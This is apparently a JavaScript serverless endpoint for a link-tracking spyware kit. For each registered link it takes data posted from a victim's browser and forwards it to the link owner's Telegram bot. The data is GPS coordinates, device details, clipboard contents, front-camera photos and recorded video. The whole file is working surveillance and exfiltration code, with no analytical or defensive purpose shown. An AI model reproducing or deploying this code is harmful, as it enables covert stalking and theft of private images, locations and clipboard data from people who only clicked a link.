const R_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL || "";
const R_TOK = process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN || "";

async function getLinks() {
  if (!R_URL || !R_TOK) return [];
  const r = await fetch(R_URL + "/get/links", { headers: { Authorization: "Bearer " + R_TOK, "Upstash-Read-Behavior": "consistent" } });
  const j = await r.json();
  return j.result ? JSON.parse(j.result) : [];
}

export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });
  let body = {};
  try { body = typeof req.body === "string" ? JSON.parse(req.body) : (req.body || {}); } catch (e) {}
  const { linkId, type, data } = body;
  const links = await getLinks();
  const link = links.find(x => x.id === linkId);
  if (!link) return res.status(404).json({ error: "Link no encontrado" });
  const T = "https://api.telegram.org/bot" + link.botToken + "/";
  const J = (o) => ({ method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(o) });
  try {
    if (type === "location") {
      await fetch(T + "sendMessage", J({ chat_id: link.chatId, text: "📍 Ubicación\nhttps://maps.google.com/?q=" + data.latitude + "," + data.longitude }));
    } else if (type === "device_info") {
      const d = (data && data.deviceInfo) || {};
      await fetch(T + "sendMessage", J({ chat_id: link.chatId, text: "📱 Device Info\n🔹 OS: " + (d.osVersion||"?") + "\n🔹 Brand: " + (d.brand||"?") + "\n🔹 Clipboard: " + String((data&&data.clipboard)||"").slice(0,300) }));
    } else if (type === "photo") {
      const b64 = String(data||"").split("base64,").pop();
      const form = new FormData();
      form.append("chat_id", link.chatId);
      form.append("photo", new Blob([Buffer.from(b64,"base64")], { type: "image/jpeg" }), "cam.jpg");
      form.append("caption", "📸 Front Camera");
      await fetch(T + "sendPhoto", { method: "POST", body: form });
    } else if (type === "video") {
      const b64 = String((data&&data.data)||data||"").split("base64,").pop();
      const form = new FormData();
      form.append("chat_id", link.chatId);
      form.append("video", new Blob([Buffer.from(b64,"base64")], { type: "video/webm" }), "v.webm");
      form.append("caption", "🎥 Video");
      await fetch(T + "sendVideo", { method: "POST", body: form });
    } else if (type === "clipboard") {
      await fetch(T + "sendMessage", J({ chat_id: link.chatId, text: "📋 Clipboard:\n" + String((data&&data.text)||"") }));
    }
  } catch (e) {
    return res.status(200).json({ success: false, error: String(e && e.message || e) });
  }
  return res.status(200).json({ success: true });
}
